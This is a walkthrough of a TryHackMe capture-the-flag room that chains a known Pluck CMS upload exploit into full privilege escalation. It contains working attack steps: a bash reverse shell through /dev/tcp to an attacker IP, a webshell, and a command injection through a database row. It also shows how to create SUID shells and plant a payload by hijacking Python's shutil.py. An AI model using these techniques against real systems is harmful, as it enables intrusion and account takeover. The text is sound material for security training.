# TryHackMe — Dreaming (Easy) Walkthrough

> Room: **Dreaming** (Easy)  
> Goal: Get initial access, then escalate through multiple users to root.

This box is a classic chain:
**web enumeration → CMS admin access → known RCE → credential discovery → DB-driven command injection → Python module hijack via scheduled job**.

---

## 1) Recon (Nmap)

Scan the target to see what’s exposed:

```/dev/null/nmap.txt#L1-1
nmap -sC -sV -T4 --min-rate=1000 -oN dreaming.txt <IP_ADDRESS>
```

### Results (key ports)

- `22/tcp` — SSH (OpenSSH 8.2p1)
- `80/tcp` — HTTP (Apache 2.4.41)
- Other ports showed as `filtered` and were not immediately useful.

The HTTP site displays the default Apache page, so the real app is likely in a hidden path.

---

## 2) Web enumeration (discover `/app`)

Since the landing page is default, brute-force directories:

```/dev/null/gobuster_root.txt#L1-1
gobuster dir -u http://<IP_ADDRESS>/ -w /usr/share/wordlists/dirb/common.txt -t 40
```

Notable hit:

- `/app` (redirect / directory)

Browse:

- `http://<IP_ADDRESS>/app/`

You’ll find a **Pluck CMS** instance (versioned directory present).

---

## 3) Enumerate Pluck CMS paths

Run enumeration again scoped to the CMS directory:

```/dev/null/gobuster_pluck.txt#L1-1
gobuster dir -u http://<IP_ADDRESS>/app/pluck-4.7.13/ -w /usr/share/wordlists/dirb/common.txt -t 40
```

Important endpoints discovered:

- `admin.php` (admin login panel)
- `/files/` (often used for uploaded content)
- `/data/`, `/docs/`, `/images/`

---

## 4) CMS admin login (weak password)

The CMS admin page prompts for a password. A small set of common guesses is worth trying first:

- `admin`
- `Admin`
- `password`
- `password123`

One of these worked in this room, granting access to the admin panel.

**Why this matters:** Admin access in older CMS versions frequently leads to file upload → RCE.

---

## 5) Exploit Pluck 4.7.13 (authenticated file upload → RCE)

Once you’ve confirmed the version (`pluck-4.7.13`), search for public exploits:

```/dev/null/searchsploit.txt#L1-1
searchsploit pluck 4.7.13
```

There is a known authenticated RCE path via **malicious file upload** (often resulting in a `.phar` webshell dropped in `/files/`).

Follow the exploit script instructions (it typically needs):
- target IP/port
- admin password
- base path: `/app/pluck-4.7.13`

Successful output looks like:

- Webshell uploaded to:  
  `http://<IP_ADDRESS>/app/pluck-4.7.13/files/shell.phar`

---

## 6) Get a reverse shell (www-data)

### 6.1 Start a listener

```/dev/null/listener.txt#L1-1
nc -lvnp 4444
```

### 6.2 Trigger reverse shell from the webshell

Generate a payload (example from revshells) and execute it via the webshell:

```/dev/null/revshell.txt#L1-1
sh -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
```

You should receive a shell as:

- `www-data`

### 6.3 Stabilize the shell

```/dev/null/pty.txt#L1-1
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 7) Local enumeration (www-data → find creds)

Check common places for scripts and secrets. In this room, `/opt` contained scripts worth reading:

- `/opt/getDreams.py` (redacted / not immediately helpful)
- `/opt/test.py` (contained credentials)

Read the files and extract the credentials from `test.py`. Use them to SSH into the target as `lucien`.

---

## 8) SSH as `lucien` → user flag

SSH in:

```/dev/null/ssh_lucien.txt#L1-1
ssh lucien@<IP_ADDRESS>
```

Grab the user flag from `lucien`’s home directory.

---

## 9) Privilege escalation: `lucien` → `death` (sudo + DB-driven injection)

### 9.1 Check sudo permissions

```/dev/null/sudo_l.txt#L1-1
sudo -l
```

You can run a script as user `death`, for example:

```/dev/null/run_as_death.txt#L1-1
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

Running it prints entries similar to:

- `Alice + Flying in the sky`
- `Bob + Exploring ancient ruins`
- …

This indicates the script is pulling data from a database (or structured storage) and printing `name + dream`.

### 9.2 Find DB credentials (shell history)

At this point, you likely don’t have DB creds directly. Searching user artifacts like `.bash_history` revealed DB login credentials.

Once you have DB creds, log into the database and inspect the relevant table:

```/dev/null/sql_steps.txt#L1-12
mysql -u <DB_USER> -p
USE library;
SHOW TABLES;
SELECT * FROM dreams;
```

You should see rows like:

- `Alice | Flying in the sky`
- `Bob | Exploring ancient ruins`
- …

### 9.3 Inject a payload via the `dreams` table

The script appears to use the `dream` field unsafely (likely passing it through a shell or formatting it into a command). You can use the DB as an injection point by inserting an entry that executes commands when processed.

Insert a record that creates an SUID bash owned by `death`:

```/dev/null/sql_inject.txt#L1-1
INSERT INTO dreams (name, dream) VALUES ('Shell', ';cp /usr/bin/bash /home/death/;chmod +s /home/death/bash;');
```

Now run the script as `death` again:

```/dev/null/trigger_inject.txt#L1-1
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

If the injection triggers, you should find:

- `/home/death/bash` with the SUID bit set

Spawn a shell as `death`:

```/dev/null/suid_death.txt#L1-1
/home/death/bash -p
```

### 9.4 Recover `death` credentials / flag

After gaining execution/context as `death`, you can read `getDreams.py` fully (the “redacted” portion becomes accessible in your notes). That revealed a password, which allowed SSH as `death`.

SSH in as `death` and grab the `death` flag.

---

## 10) Privilege escalation: `death` → `morpheus` (Python module hijacking)

From `death`, enumerate for:
- cron jobs / scheduled scripts
- privileged Python scripts importing standard modules
- writable system Python libraries (misconfigured permissions)

A key clue was found via `.viminfo` indicating edits/paths involving:

- `python3.8/shutil.py`

Check permissions on the Python library file. In this room it was writable due to group membership, which is a major misconfiguration.

### 10.1 Identify what uses `shutil.copy2`

A privileged automation script (e.g., `restore.py`) run as `morpheus` uses:

- `shutil.copy2(...)`

Because Python executes module code at import time, modifying `shutil.py` lets you run commands in the context of the scheduled job.

### 10.2 Add a payload to `shutil.py`

Append (or safely insert) a one-liner that creates an SUID bash in morpheus’s home:

```/dev/null/shutil_payload.txt#L1-1
os.system("cp /usr/bin/bash /home/morpheus/;chmod +s /home/morpheus/bash")
```

Wait for the scheduled job to run (or trigger it if you can).

### 10.3 Use the SUID bash to become `morpheus` / root-equivalent

Once the payload executes, run:

```/dev/null/morpheus_suid.txt#L1-1
/home/morpheus/bash -p
```

This yields a privileged shell, allowing you to read the final flag.

---

## Summary (attack chain)

1. Nmap → find HTTP + SSH
2. Web enum → discover `/app`
3. Identify Pluck CMS `4.7.13`
4. Weak admin password → admin panel access
5. Authenticated upload exploit → webshell in `/files/`
6. Reverse shell → `www-data`
7. Enumerate `/opt` → creds in `test.py`
8. SSH as `lucien` → user flag
9. `sudo -u death getDreams.py` + DB creds from history → SQL injection into `dreams` table
10. Create SUID bash → pivot to `death` and read flag
11. Writable Python stdlib (`shutil.py`) + scheduled `restore.py` using `copy2` → module hijack
12. Create SUID bash for `morpheus` → privileged shell → final flag